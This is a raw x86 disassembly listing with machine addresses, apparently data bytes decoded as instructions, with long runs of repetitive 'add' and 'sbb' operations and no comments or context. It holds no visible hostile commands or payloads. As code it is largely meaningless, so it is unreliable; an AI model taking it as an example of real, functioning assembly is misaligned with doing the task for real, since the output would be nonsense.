  404eb9:	add    BYTE PTR ds:0x2a4400,dh
  404ebf:	add    BYTE PTR [eax],al
  404ec1:	add    BYTE PTR [esi-0x26ddde00],al
  404ec7:	add    esi,DWORD PTR ds:0x2a5400
  404ecd:	add    BYTE PTR [eax],al
  404ecf:	add    BYTE PTR [esi-0x1fddb900],al
  404ed5:	add    esi,DWORD PTR [esi]
  404ed7:	add    al,ch
  404ed9:	sub    DWORD PTR [eax],eax
  404edb:	add    BYTE PTR [eax],al
  404edd:	add    BYTE PTR [esi+0x41026b18],al
  404ee3:	add    BYTE PTR [edi],dh
  404ee5:	add    al,dh
  404ee7:	sub    DWORD PTR [eax],eax
  404ee9:	add    BYTE PTR [eax],al
  404eeb:	add    BYTE PTR [esi-0x26dd6d00],al
  404ef1:	add    esi,DWORD PTR [edi]
  404ef3:	add    BYTE PTR [eax],al
  404ef5:	add    BYTE PTR [ecx],al
  404ef7:	add    BYTE PTR [ebx+0x1000019],dl
  404efd:	add    BYTE PTR [eax+0x1000019],bl
  404f03:	add    BYTE PTR [eax+0x1000019],bl
  404f09:	add    BYTE PTR [edi+0x2000019],bl
  404f0f:	add    BYTE PTR [ecx+ebx*1+0x10000],ch
  404f16:	cwde   
  404f17:	sbb    DWORD PTR [eax],eax
  404f19:	add    BYTE PTR [ecx],al
  404f1b:	add    BYTE PTR [eax+0x1000019],bl
  404f21:	add    BYTE PTR [eax+0x1000019],bl
  404f27:	add    BYTE PTR [eax+0x1000019],bl
  404f2d:	add    BYTE PTR [eax+0x1000019],bl
  404f33:	add    BYTE PTR [edi+0x1000019],dh
  404f39:	add    BYTE PTR [eax+0x1000019],bl
  404f3f:	add    BYTE PTR [esi+0x1000019],bh
  404f45:	add    BYTE PTR [esi+0x1000019],bh
  404f4b:	add    BYTE PTR [esi+0x1000019],bh
  404f51:	add    BYTE PTR [eiz*1+0x10000],bl
  404f58:	sbb    al,0x25
  404f5a:	add    BYTE PTR [eax],al
  404f5c:	add    DWORD PTR [eax],eax
  404f5e:	push   ebp
  404f5f:	and    al,BYTE PTR [eax]
  404f61:	add    BYTE PTR [ecx],al
  404f63:	add    ch,al
  404f65:	sbb    DWORD PTR [eax],eax
  404f67:	add    BYTE PTR [ecx],al
  404f69:	add    BYTE PTR [ebx+0x1000019],dl
  404f6f:	add    dh,cl
  404f71:	sbb    DWORD PTR [eax],eax
  404f73:	add    BYTE PTR [ecx],al
  404f75:	add    dh,cl
  404f77:	sbb    DWORD PTR [eax],eax
  404f79:	add    BYTE PTR [ecx],al
  404f7b:	add    dh,cl
  404f7d:	sbb    DWORD PTR [eax],eax
  404f7f:	add    BYTE PTR [ecx],al
  404f81:	add    dh,cl
  404f83:	sbb    DWORD PTR [eax],eax
  404f85:	add    BYTE PTR [ecx],al
  404f87:	add    dh,cl
  404f89:	sbb    DWORD PTR [eax],eax
  404f8b:	add    BYTE PTR [ecx],al
  404f8d:	add    dh,cl
  404f8f:	sbb    DWORD PTR [eax],eax
  404f91:	add    BYTE PTR [ecx],al
  404f93:	add    dh,cl
  404f95:	sbb    DWORD PTR [eax],eax
  404f97:	add    BYTE PTR [ecx],al
  404f99:	add    dh,cl
  404f9b:	sbb    DWORD PTR [eax],eax
  404f9d:	add    BYTE PTR [ecx],al
  404f9f:	add    dh,cl
  404fa1:	sbb    DWORD PTR [eax],eax
  404fa3:	add    BYTE PTR [ecx],al
  404fa5:	add    dh,cl
  404fa7:	sbb    DWORD PTR [eax],eax
  404fa9:	add    BYTE PTR [ecx],al
  404fab:	add    dh,cl
  404fad:	sbb    DWORD PTR [eax],eax
  404faf:	add    BYTE PTR [ecx],al
  404fb1:	add    dh,cl
  404fb3:	sbb    DWORD PTR [eax],eax
  404fb5:	add    BYTE PTR [ecx],al
  404fb7:	add    dh,cl
  404fb9:	sbb    DWORD PTR [eax],eax
  404fbb:	add    BYTE PTR [ecx],al
  404fbd:	add    dh,cl
  404fbf:	sbb    DWORD PTR [eax],eax
  404fc1:	add    BYTE PTR [ecx],al
  404fc3:	add    dh,cl
  404fc5:	sbb    DWORD PTR [eax],eax
  404fc7:	add    BYTE PTR [ecx],al
  404fc9:	add    ah,dl
  404fcb:	sbb    DWORD PTR [eax],eax
  404fcd:	add    BYTE PTR [ecx],al
  404fcf:	add    dh,bl
  404fd1:	sbb    DWORD PTR [edx],eax
  404fd3:	add    BYTE PTR [edx],al
  404fd5:	add    bh,ah
  404fd7:	sbb    DWORD PTR [eax],eax
  404fd9:	add    BYTE PTR [ecx],al
  404fdb:	add    dh,bl
  404fdd:	sbb    DWORD PTR [edx],eax
  404fdf:	add    BYTE PTR [edx],al
  404fe1:	add    BYTE PTR [edx],bl
  404fe3:	sbb    al,BYTE PTR [eax]
  404fe5:	add    BYTE PTR [ecx],al
  404fe7:	add    dh,bl
  404fe9:	sbb    DWORD PTR [edx],eax
  404feb:	add    BYTE PTR [edx],al
  404fed:	add    BYTE PTR [edx],ah
  404fef:	sbb    al,BYTE PTR [eax]
  404ff1:	add    BYTE PTR [ecx],al
  404ff3:	add    dh,bl
  404ff5:	sbb    DWORD PTR [edx],eax
  404ff7:	add    BYTE PTR [edx],al
  404ff9:	add    BYTE PTR [ecx],ch
  404ffb:	sbb    al,BYTE PTR [eax]
  404ffd:	add    BYTE PTR [ecx],al
  404fff:	add    BYTE PTR [eax],dh
  405001:	sbb    al,BYTE PTR [eax]
  405003:	add    BYTE PTR [ecx],al
  405005:	add    BYTE PTR [edx+ebx*1],dh
  405008:	add    BYTE PTR [eax],al
  40500a:	add    DWORD PTR [eax],eax
  40500c:	inc    eax
  40500d:	sbb    al,BYTE PTR [eax]
  40500f:	add    BYTE PTR [ecx],al
  405011:	add    dh,cl
  405013:	sbb    DWORD PTR [eax],eax
  405015:	add    BYTE PTR [ecx],al
  405017:	add    BYTE PTR [edx],ah
  405019:	sbb    al,BYTE PTR [eax]
  40501b:	add    BYTE PTR [edx],al
  40501d:	add    BYTE PTR [ebx+0x1a],dl
  405020:	add    BYTE PTR [eax],al
  405022:	add    DWORD PTR [eax],eax
  405024:	push   ebx
  405025:	sbb    al,BYTE PTR [eax]
  405027:	add    BYTE PTR [ecx],al
  405029:	add    dh,cl
  40502b:	sbb    DWORD PTR [eax],eax
  40502d:	add    BYTE PTR [ecx],al
  40502f:	add    BYTE PTR [ebp+0x22],dl
  405032:	add    BYTE PTR [eax],al
  405034:	add    DWORD PTR [eax],eax
  405036:	push   edi
  405037:	and    al,BYTE PTR [eax]
  405039:	add    BYTE PTR [ecx],al
  40503b:	add    BYTE PTR [ebp+0x22],dl
  40503e:	add    al,0x0
  405040:	or     al,0x0
  405042:	add    eax,0x6000c00
  405047:	add    BYTE PTR [eax+eax*1],cl
  40504a:	pop    es
  40504b:	add    BYTE PTR [eax+eax*1],cl
  40504e:	or     BYTE PTR [eax],al
  405050:	or     al,0x0
  405052:	or     DWORD PTR [eax],eax
  405054:	push   es
  405055:	add    BYTE PTR [ecx+0x41026b00],ch
  40505b:	add    BYTE PTR [ecx-0x36fd9500],dh
  405061:	add    BYTE PTR [ecx-0x3ffd9500],bh
  405067:	add    cl,al
  405069:	add    BYTE PTR [ebx+0x2],ch
  40506c:	rol    BYTE PTR [eax],0xc9
  40506f:	add    BYTE PTR [ebx+0x2],ch
  405072:	leave  
  405073:	add    cl,dl
  405075:	add    BYTE PTR [ebx+0x2],ch
  405078:	leave  
  405079:	add    cl,bl
  40507b:	add    BYTE PTR [ebx+0x2],ch
  40507e:	leave  
  40507f:	add    cl,ah
  405081:	add    BYTE PTR [ebx+0x2],ch
  405084:	leave  
  405085:	add    cl,ch
  405087:	add    BYTE PTR [ebx+0x2],ch
  40508a:	leave  
  40508b:	add    cl,dh
  40508d:	add    BYTE PTR [ebx+0x2],ch
  405090:	leave  
  405091:	add    cl,bh
  405093:	add    BYTE PTR [ebx+0x2],ch
  405096:	leave  
  405097:	add    BYTE PTR [ecx],al
  405099:	add    DWORD PTR [ebx+0x2],ebp
  40509c:	leave  
  40509d:	add    BYTE PTR [ecx],cl
  40509f:	add    DWORD PTR [ebx+0x2],ebp
  4050a2:	leave  
  4050a3:	add    BYTE PTR [ecx],dl
  4050a5:	add    DWORD PTR [ebx+0x2],ebp
  4050a8:	leave  
  4050a9:	add    BYTE PTR [ecx],bl
  4050ab:	add    DWORD PTR [ebx+0x2],ebp
  4050ae:	fadd   QWORD PTR [ecx]
  4050b0:	sub    DWORD PTR [ecx],eax
  4050b2:	imul   eax,DWORD PTR [edx],0xffffffc0
  4050b5:	add    BYTE PTR [ecx],dh
  4050b7:	add    DWORD PTR [ebx+0x2],ebp
  4050ba:	leave  
  4050bb:	add    BYTE PTR [ecx],bh
  4050bd:	add    DWORD PTR [ebx+0x2],ebp
  4050c0:	in     al,0x1
  4050c2:	inc    ecx
  4050c3:	add    DWORD PTR [ebx+0x2],ebp
  4050c6:	inc    ecx
  4050c7:	add    BYTE PTR [ecx+0x1],cl
  4050ca:	imul   eax,DWORD PTR [edx],0xffffffea
  4050cd:	add    DWORD PTR [ecx+0x1],ebx
  4050d0:	imul   eax,DWORD PTR [edx],0x78
  4050d3:	add    DWORD PTR [ecx+0x1],esp
  4050d6:	adc    al,0x1d
  4050d8:	xchg   ebx,eax
  4050d9:	add    ch,BYTE PTR [ecx+0x1]
  4050dc:	inc    esp
  4050dd:	sbb    eax,0x1690298
  4050e2:	push   edx
  4050e3:	sbb    eax,0x16100c5
  4050e8:	adc    al,0x1d
  4050ea:	sahf   
  4050eb:	add    bh,BYTE PTR [ecx+0x1]
  4050ee:	jno    0x40510d
  4050f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050f1:	add    al,BYTE PTR [ecx-0x55e275ff]
  4050f7:	add    bh,BYTE PTR [ecx+0x1]
  4050fa:	sahf   
  4050fb:	sbb    eax,0x191011f
  405100:	enter  0xb21d,0x2
  405104:	mov    eax,ds:0x361de601
  405109:	add    BYTE PTR [ecx+0x361e0201],ah
  40510f:	add    BYTE PTR [ecx+0x361e2201],ah
  405115:	add    BYTE PTR [ecx+0x361e3a01],ah
  40511b:	add    BYTE PTR [ecx+0x361e5701],ah
  405121:	add    BYTE PTR [ecx-0x3ae18eff],cl
  405127:	add    BYTE PTR [ecx-0x47e17dff],cl
  40512d:	add    cl,BYTE PTR [ecx]
  40512f:	add    BYTE PTR [edx-0x76ff3ae2],cl
  405135:	add    DWORD PTR [ebx+0x6100c51e],edx
  40513b:	add    DWORD PTR [ebx*1+0x1b102be],edx
  405142:	stos   DWORD PTR es:[edi],eax
  405143:	push   ds
  405144:	fild   DWORD PTR [edx]
  405146:	popa   
  405147:	add    eax,eax
  405149:	push   ds
  40514a:	loope  0x40514e
  40514c:	mov    cl,0x1
  40514e:	xlat   BYTE PTR ds:[ebx]
  40514f:	push   ds
  405150:	in     eax,0x2
  405152:	mov    ecx,0xc50b7701
  405157:	add    BYTE PTR [ecx],ch
  405159:	add    dl,ch
  40515b:	push   ds
  40515c:	jmp    0x405160
  40515e:	add    DWORD PTR [ecx],0x2fc1f0b
  405164:	and    DWORD PTR [eax],eax
  405166:	adc    bl,BYTE PTR [edi]
  405168:	add    al,BYTE PTR [ebx]
  40516a:	popa   
  40516b:	add    DWORD PTR [ebx*1+0x290308],edx
  405172:	sbb    bl,BYTE PTR [edi]
  405174:	or     al,0x3
  405176:	sub    DWORD PTR [eax],eax
  405178:	aaa    
  405179:	pop    ds
  40517a:	or     al,0x3
  40517c:	sub    DWORD PTR [eax],eax
  40517e:	dec    eax
  40517f:	pop    ds
  405180:	or     al,0x3
  405182:	popa   
  405183:	add    DWORD PTR [ebx*1+0x1610314],edx
  40518a:	adc    al,0x1d
  40518c:	sbb    eax,DWORD PTR [ebx]
  40518e:	leave  
  40518f:	add    DWORD PTR [ebx+0x2],ebp
  405192:	inc    ecx
  405193:	add    cl,cl
  405195:	add    DWORD PTR [edx+0x1f],edi
  405198:	sub    al,BYTE PTR [ebx]
  40519a:	rol    DWORD PTR [ecx],1
  40519c:	stos   BYTE PTR es:[edi],al
  40519d:	pop    ds
  40519e:	xor    al,BYTE PTR [ebx]
  4051a0:	leave  
  4051a1:	add    DWORD PTR [edx-0x36fcbce1],esi
  4051a7:	add    DWORD PTR [ecx-0x5efcb5e1],edi
  4051ad:	add    ah,al
  4051af:	pop    ds
  4051b0:	ret    
  4051b1:	add    DWORD PTR [ecx-0x3ae028ff],esi
  4051b7:	add    cl,bl
  4051b9:	add    esp,esi
  4051bb:	pop    ds
  4051bc:	pop    ecx
  4051bd:	add    ebx,ecx
  4051bf:	add    DWORD PTR [ebx],eax
  4051c1:	and    ch,al
  4051c3:	add    BYTE PTR [ecx+0x1],bh
  4051c6:	and    BYTE PTR es:[eax+0x3],ah
  4051ca:	imul   eax,DWORD PTR [eax],0xc5202d
  4051d0:	jmp    0xe860a1d6
  4051d5:	add    cl,dh
  4051d7:	add    DWORD PTR [ebx+0x2],ebp
  4051da:	inc    ecx
  4051db:	add    BYTE PTR [ecx+0x0],bh
  4051de:	jo     0x4051eb
  4051e0:	adc    BYTE PTR [ecx],al
  4051e2:	icebp  
  4051e3:	add    DWORD PTR [esi+0x20],esi
  4051e6:	js     0x4051e9
  4051e8:	jns    0x4051ea
  4051ea:	test   BYTE PTR [eax],ah
  4051ec:	lds    eax,FWORD PTR [eax]
  4051ee:	mov    DWORD PTR [eax],eax
  4051f0:	xchg   esp,eax
  4051f1:	and    cl,cl
  4051f3:	add    BYTE PTR [ecx-0x3adf5d00],cl
  4051f9:	add    cl,dh
  4051fb:	add    DWORD PTR [edx+0x1011020],esi
  405201:	add    ch,BYTE PTR [ebx+0x2]
  405204:	inc    ecx
  405205:	add    BYTE PTR [ecx+0x4120dc00],al
  40520b:	add    BYTE PTR [ecx],cl
  40520d:	add    BYTE PTR [ebx+0x2],ch
  405210:	inc    ecx
  405211:	add    BYTE PTR [ecx-0x7cdef900],al
  405217:	add    edx,DWORD PTR [eax+eax*1]
  40521a:	dec    eax
  40521b:	and    DWORD PTR [edx+0x53021903],edx
  405221:	and    DWORD PTR [eax+0x61021902],ebx
  405227:	and    ebp,eax
  405229:	add    BYTE PTR [ecx-0x68de8dff],al
  40522f:	add    esp,DWORD PTR [ecx]
  405231:	add    bh,BYTE PTR [edi+0x21]
  405234:	call   0x6b427b39
  405239:	add    al,BYTE PTR [ecx+0x0]
  40523c:	sub    DWORD PTR [edx],eax
  40523e:	cwde   
  40523f:	and    ecx,ecx
  405241:	add    BYTE PTR [ecx],ch
  405243:	add    ch,BYTE PTR [edx+0x3100c921]
  405249:	add    al,bl
  40524b:	and    DWORD PTR [eax-0x20ff7efd],esi
  405251:	and    edx,eax
  405253:	add    edi,DWORD PTR [ecx]
  405255:	add    ah,BYTE PTR [ecx+0x1c03eb22]
  40525b:	add    BYTE PTR [ecx+0x1c039222],ch
  405261:	add    BYTE PTR [ebx+0x3900bc22],bh
  405267:	add    al,BYTE PTR [eax+eiz*1+0x17900c5]
  40526e:	enter  0xf522,0x3
  405272:	inc    ecx
  405273:	add    ah,BYTE PTR [ecx-0x16fc14de]
  405279:	add    esp,edx
  40527b:	and    al,BYTE PTR [esp+eax*1]
  40527e:	inc    ecx
  40527f:	add    bl,ch
  405281:	and    bh,BYTE PTR [eax+eax*1+0x230001a1]
  405288:	add    BYTE PTR ss:[ecx+0x0],al
  40528c:	mov    eax,ds:0x4103eb22
  405291:	add    BYTE PTR [ebx],ch
  405293:	and    ecx,DWORD PTR [edx]
  405295:	add    al,0x24
  405297:	add    BYTE PTR [esi],bh
  405299:	and    edx,DWORD PTR [eax]
  40529b:	add    DWORD PTR [eax+eax*1],ebp
  40529e:	imul   eax,DWORD PTR [edx],0x28
  4052a1:	add    al,0xd1
  4052a3:	add    DWORD PTR [edi+0x23],ecx
  4052a6:	cs add al,0xd1
  4052a9:	add    DWORD PTR [ebp+0x23],edx
  4052ac:	dec    esp
  4052ad:	add    al,0xd1
  4052af:	add    DWORD PTR [ebx+0x23],ebx
  4052b2:	push   edi
  4052b3:	add    al,0xd1
  4052b5:	add    DWORD PTR [ebp+0x23],edx
  4052b8:	fs add al,0x41
  4052bb:	add    dh,bl
  4052bd:	add    eax,0x4100de
  4052c2:	rol    DWORD PTR ds:0x23100d9,cl
  4052c8:	and    esi,DWORD PTR gs:[eax+0x76006903]
  4052cf:	and    ecx,ecx
  4052d1:	add    BYTE PTR [ecx+0x0],al
  4052d4:	mov    BYTE PTR [ebx],ah
  4052d6:	ja     0x4052dc
  4052d8:	xor    al,0x0
  4052da:	imul   eax,DWORD PTR [edx],0x28
  4052dd:	add    al,0x3c
  4052df:	add    BYTE PTR [ebx-0x5efb6ddd],ch
  4052e5:	add    BYTE PTR [ebp+0x4101c323],dh
  4052eb:	add    dl,cl
  4052ed:	and    eax,ebp
  4052ef:	add    BYTE PTR [ecx],dh
  4052f1:	add    ah,ah
  4052f3:	and    ebx,DWORD PTR [ebp+0x6b026904]
  4052f9:	add    ah,BYTE PTR [ebx+0x6b027904]
  4052ff:	add    ch,BYTE PTR [edx-0x54fd66fc]
  405305:	and    al,0xbf
  405307:	add    al,0x79
  405309:	add    dh,BYTE PTR [esp+0x24104c5]
  405310:	imul   eax,DWORD PTR [edx],0xffffffd9
  405313:	add    al,0x3c
  405315:	add    bl,cl
  405317:	and    al,0xdf
  405319:	add    al,0x41
  40531b:	add    bh,cl
  40531d:	and    al,0xc5
  40531f:	add    cl,ch
  405321:	add    esi,ebx
  405323:	and    al,0xe5
  405325:	add    al,0x69
  405327:	add    al,ch
  405329:	and    al,0xbc
  40532b:	add    BYTE PTR [ecx+0x41026b02],ch
  405331:	add    BYTE PTR [ecx+0x41026b02],dh
  405337:	add    BYTE PTR [ecx+0x4025b802],dh
  40533d:	add    eax,0x25e40044
  405342:	push   edx
  405343:	add    eax,0x25f2004c
  405348:	xchg   edx,eax
  405349:	add    esi,DWORD PTR [ecx+0x6325fe02]
  40534f:	add    eax,0x260d004c
  405354:	mov    esp,0x2202c900
  405359:	es inc ecx
  40535b:	add    BYTE PTR [ecx+0x6c266b02],dh
  405361:	add    eax,0x267b02e9
  405366:	inc    ecx
  405367:	add    BYTE PTR [ecx-0x7ed964fe],bh
  40536d:	add    eax,0x26b0054
  405372:	sub    BYTE PTR [ecx+edx*8],al
  405375:	add    eax,ecx
  405377:	es xchg edi,eax
  405379:	add    eax,0x26b0024
  40537e:	mov    eax,0xd0004105
  405383:	es ret 0x4105
  405387:	add    bl,ah
  405389:	lds    eax,FWORD PTR es:[eax]
  40538c:	pop    esp
  40538d:	add    ah,ah
  40538f:	and    eax,0x6405f2
  405394:	repnz and eax,0x3090392
  40539a:	or     eax,0x4400bc26
  40539f:	add    BYTE PTR [ebx+0x2],ch
  4053a2:	inc    ecx
  4053a3:	add    BYTE PTR [ecx+0x0],al
  4053a6:	pop    ebx
  4053a7:	daa    
  4053a8:	adc    eax,DWORD PTR [esi]
  4053aa:	inc    esp
  4053ab:	add    bl,cl
  4053ad:	and    al,0xdf
  4053af:	add    al,0x81
  4053b1:	add    DWORD PTR [edx+0x27],esi
  4053b4:	adc    al,0x3
  4053b6:	ins    BYTE PTR es:[edi],dx
  4053b7:	add    BYTE PTR [ebx+0x2],ch
  4053ba:	inc    ecx
  4053bb:	add    BYTE PTR [ecx+0x36277c01],ah
  4053c1:	add    BYTE PTR [eax+eax*1-0x35],ch
  4053c5:	and    al,0x35
  4053c7:	push   es
  4053c8:	mov    eax,ds:0x36279a01
  4053cd:	add    BYTE PTR [ecx+0x3627b501],ah
  4053d3:	add    BYTE PTR [ecx+0x3627dc01],ah
  4053d9:	add    BYTE PTR [ecx],bl
  4053db:	add    ah,bh
  4053dd:	daa    
  4053de:	cmp    eax,0x6001906
  4053e3:	sub    BYTE PTR [eax],dl
  4053e5:	add    DWORD PTR [eax+eax*1+0x15],ebp
  4053e9:	sub    BYTE PTR [edx+0x6],al
  4053ec:	sbb    DWORD PTR [eax],eax
  4053ee:	and    eax,0x1900c528
  4053f3:	add    ebp,DWORD PTR [ebx+0x2]
  4053f6:	inc    ecx
  4053f7:	add    BYTE PTR [ecx],ch
  4053f9:	add    BYTE PTR [ebx+0x2],ch
  4053fc:	inc    ecx
  4053fd:	add    BYTE PTR [ecx],ch
  4053ff:	add    BYTE PTR [eax+ebp*1+0x49],al
  405403:	push   es
  405404:	and    DWORD PTR [ebx],eax
  405406:	jg     0x405429
  405408:	call   0x6843750d
  40540d:	sub    BYTE PTR [eax+0x6],dl
  405410:	sub    DWORD PTR [eax],eax
  405412:	js     0x40543c
  405414:	popa   
  405415:	push   es
  405416:	je     0x405418
  405418:	imul   eax,DWORD PTR [edx],0x28
  40541b:	add    al,0x29
  40541d:	add    BYTE PTR [ecx+0x79066e28],dl
  405423:	add    DWORD PTR [esi+0x7c00e828],esp
  405429:	add    BYTE PTR [ebx+0x2],ch
  40542c:	sub    BYTE PTR [esp+eax*4],al
  40542f:	add    BYTE PTR [ebx+0x2],ch
  405432:	sub    BYTE PTR [ecx+ebp*2],al
  405435:	add    BYTE PTR [ebx+0x2],ch
  405438:	inc    ecx
  405439:	add    BYTE PTR [ecx],bh
  40543b:	add    eax,eax
  40543d:	sub    BYTE PTR [esi],dh
  40543f:	add    BYTE PTR [ecx+0x3],al
  405442:	imul   eax,DWORD PTR [edx],0xffffffc0
  405445:	add    BYTE PTR [ecx+0x0],ch
  405448:	jecxz  0x405472
  40544a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544b:	push   es
  40544c:	jns    0x40544f
  40544e:	out    dx,eax
  40544f:	sub    al,ch
  405451:	add    cl,bh
  405453:	add    DWORD PTR [edx],eax
  405455:	sub    DWORD PTR [ebx+0xb01e906],esi
  40545b:	sub    DWORD PTR [esi+0x17006906],edi
  405461:	sub    DWORD PTR [eax+eax*1+0x292c0231],edi
  405468:	mov    al,0x3
  40546a:	dec    ecx
  40546b:	add    ebp,DWORD PTR [ebx+0x2]
  40546e:	leave  
  40546f:	add    BYTE PTR [ecx-0x31d6adff],al
  405475:	push   es
  405476:	sbb    al,0x0
  405478:	imul   eax,DWORD PTR [edx],0xffffffdf
  40547b:	add    al,0x1c
  40547d:	add    BYTE PTR [eax+0x29],ah
  405480:	xchg   edx,eax
  405481:	add    edi,DWORD PTR [ecx+0x0]
  405484:	push   0x29
  405486:	loope  0x40548e
  405488:	jns    0x40548a
  40548a:	jns    0x4054b5
  40548c:	out    0x6,eax
  40548e:	push   ecx
  40548f:	add    esp,DWORD PTR [ebx+0x51070229]
  405495:	add    edi,DWORD PTR [edx+0x51070729]
  40549b:	add    ecx,esi
  40549d:	sub    DWORD PTR [ebx],ecx
  40549f:	pop    es
  4054a0:	imul   eax,DWORD PTR [ecx],0x710026b
  4054a6:	mov    WORD PTR [eax],es
  4054a8:	cld    
  4054a9:	daa    
  4054aa:	and    DWORD PTR [edi],eax
  4054ac:	add    DWORD PTR [eax],0x4129fb
  4054b2:	jmp    0x9d6a59b8
  4054b7:	add    al,0x69
  4054b9:	add    esi,DWORD PTR [edi]
  4054bb:	sub    ah,BYTE PTR [edi]
  4054bd:	pop    es
  4054be:	imul   eax,DWORD PTR [eax],0x7332a60
  4054c4:	imul   eax,DWORD PTR [eax],0x7332a79
  4054ca:	add    DWORD PTR [eax],0x7392aa6
  4054d0:	mov    DWORD PTR [eax],eax
  4054d2:	mov    bl,0x2a
  4054d4:	test   DWORD PTR [ecx],eax
  4054d6:	jns    0x4054db
  4054d8:	mov    edi,0x44074a2a
  4054dd:	add    BYTE PTR [ebx+0x2],ch
  4054e0:	mov    eax,0xd2004105
  4054e5:	sub    cl,BYTE PTR [edi+0x7]
  4054e8:	add    DWORD PTR [eax],0x7822aeb
  4054ee:	add    DWORD PTR [ebx],0x7872b0b
  4054f4:	mov    DWORD PTR [eax],eax
  4054f6:	and    ch,BYTE PTR [ebx]
  4054f8:	lea    eax,[edi]
  4054fa:	mov    DWORD PTR [ebx],eax
  4054fc:	imul   eax,DWORD PTR [edx],0xffffffe4
  4054ff:	add    DWORD PTR [ecx+0x41026b03],edx
  405505:	add    BYTE PTR [ecx],cl
  405507:	add    BYTE PTR [esi+0x2b],bh
  40550a:	xlat   BYTE PTR ds:[ebx]
  40550b:	pop    es
  40550c:	test   eax,0xdd2ba001
  405511:	pop    es
  405512:	test   eax,0xe62bb201
  405517:	pop    es
  405518:	cdq    
  405519:	add    BYTE PTR [ebx+0x2],ch
  40551c:	in     al,dx
  40551d:	pop    es
  40551e:	cdq    
  40551f:	add    BYTE PTR [edi-0x5ef806d5],bh
  405525:	add    ebp,DWORD PTR [ebx+0x2]
  405528:	add    BYTE PTR [eax],cl
  40552a:	or     BYTE PTR [eax],al
  40552c:	and    BYTE PTR [eax],al
  40552e:	jbe    0x405530
  405530:	or     BYTE PTR [eax],al
  405532:	and    al,0x0
  405534:	jnp    0x405536
  405536:	or     BYTE PTR [eax],al
  405538:	sub    BYTE PTR [eax],al
  40553a:	add    BYTE PTR [eax],0x8
  40553d:	add    BYTE PTR [eax+eax*1],ch
  405540:	test   DWORD PTR [eax],eax
  405542:	or     BYTE PTR [eax],al
  405544:	xor    BYTE PTR [eax],al
  405546:	mov    al,BYTE PTR [eax]
  405548:	add    eax,DWORD PTR [eax]
  40554a:	xor    al,0x0
  40554c:	xchg   edx,eax
  40554d:	add    BYTE PTR [eax],cl
  40554f:	add    BYTE PTR [eax+0x0],bh
  405552:	jbe    0x405554
  405554:	or     BYTE PTR [eax],al
  405556:	jl     0x405558
  405558:	push   ebx
  405559:	add    DWORD PTR [eax],ecx
  40555b:	add    BYTE PTR [eax+0x8015800],al
  405561:	add    BYTE PTR [eax+eax*1+0x8015d],al
  405568:	mov    BYTE PTR [eax],al
  40556a:	bound  eax,QWORD PTR [ecx]
  40556c:	or     BYTE PTR [eax],al
  40556e:	mov    WORD PTR [eax],es
  405570:	add    DWORD PTR [bx+si],ecx
  405573:	add    BYTE PTR [eax+0x8007600],dl
  405579:	add    BYTE PTR [eax+eax*1+0x8007b],dl
  405580:	cwde   
  405581:	add    BYTE PTR [eax-0x63fff800],al
  405587:	add    BYTE PTR [ebx+0x0],bh
  40558a:	or     BYTE PTR [eax],al
  40558c:	mov    al,ds:0x8008000
  405591:	add    BYTE PTR [eax+eax*1+0x8007b],ah
  405598:	test   al,0x0
  40559a:	jnp    0x40559c
  40559c:	or     BYTE PTR [eax],al
  40559e:	lods   al,BYTE PTR ds:[esi]
  40559f:	add    BYTE PTR [ebx+0x0],bh
  4055a2:	or     BYTE PTR [eax],al
  4055a4:	mov    al,0x0
  4055a6:	add    BYTE PTR [eax],0x8
  4055a9:	add    BYTE PTR [eax+eax*1+0x8016c],dh
  4055b0:	mov    eax,0x21008500
  4055b5:	add    bl,dl
  4055b7:	add    edi,DWORD PTR [ebx+0x0]
  4055ba:	add    BYTE PTR cs:[ebx+0x2e0ca200],ch
  4055c1:	add    BYTE PTR [ebx+0x0],al
  4055c4:	or     BYTE PTR ds:0x4b00,ch
  4055c9:	add    BYTE PTR [edx-0x64ffd1f8],al
  4055cf:	add    BYTE PTR [ebx-0x5cffd1f4],al
  4055d5:	add    BYTE PTR [edi],al
  4055d7:	or     BYTE PTR [esi],ch
  4055d9:	add    BYTE PTR [ebx],dl
  4055db:	add    BYTE PTR [eax],dl
  4055dd:	or     BYTE PTR [esi],ch
  4055df:	add    BYTE PTR [ebx],bl
  4055e1:	add    BYTE PTR [eax+0x8],cl
  4055e4:	add    BYTE PTR cs:[ebx],ah
  4055e7:	add    BYTE PTR [eax+0x8],cl
  4055ea:	add    BYTE PTR cs:[ebx],ch
  4055ed:	add    BYTE PTR [esi+0x8],cl
  4055f0:	add    BYTE PTR cs:[ebx],dh
  4055f3:	add    BYTE PTR [esi+0x8],cl
  4055f6:	add    BYTE PTR cs:[ebx],bh
  4055f9:	add    BYTE PTR [esi+0x8],cl
  4055fc:	add    BYTE PTR cs:[ebx+0x0],dh
  405600:	out    dx,al
  405601:	or     BYTE PTR [esi],ch
  405603:	add    BYTE PTR [ebx+0x2e093900],dl
  405609:	add    BYTE PTR [ebx+0x0],ah
  40560c:	fmul   QWORD PTR [eax]
  40560e:	add    BYTE PTR cs:[ebx+0x0],ch
  405612:	fmul   QWORD PTR [eax]
  405614:	add    BYTE PTR cs:[ebx+0x0],dl
  405618:	test   al,0x8
  40561a:	add    BYTE PTR cs:[ebx+0x0],bh
  40561e:	cld    
  40561f:	or     BYTE PTR [esi],ch
  405621:	add    BYTE PTR [ebx+0x2e090800],al
  405627:	add    BYTE PTR [ebx+0x41090e00],cl
  40562d:	add    bl,dl
  40562f:	add    edi,DWORD PTR [ebx+0x0]
  405632:	popa   
  405633:	add    bl,dl
  405635:	add    edi,DWORD PTR [ebx+0x0]
  405638:	inc    ebx
  405639:	add    ebx,ebx
  40563b:	add    al,0x7b
  40563d:	add    cl,al
  40563f:	add    ebx,edx
  405641:	add    edi,DWORD PTR [ebx+0x0]
  405644:	loope  0x405647
  405646:	rol    DWORD PTR [ebx],cl
  405648:	jnp    0x40564a
  40564a:	jecxz  0x40564d
  40564c:	cmp    eax,DWORD PTR [esi]
  40564e:	xchg   esi,eax
  40564f:	pop    es
  405650:	jecxz  0x405653
  405652:	inc    ebx
  405653:	push   es
  405654:	jnp    0x405656
  405656:	jecxz  0x405659
  405658:	rol    DWORD PTR [ebx],cl
  40565a:	jnp    0x40565c
  40565c:	add    DWORD PTR [edx],eax
  40565e:	rol    DWORD PTR [ebx],cl
  405660:	jnp    0x405662
  405662:	add    eax,DWORD PTR [edx]
  405664:	rol    DWORD PTR [ebx],cl
  405666:	jnp    0x405668
  405668:	and    DWORD PTR [edx],eax
  40566a:	rol    DWORD PTR [ebx],cl
  40566c:	jnp    0x40566e
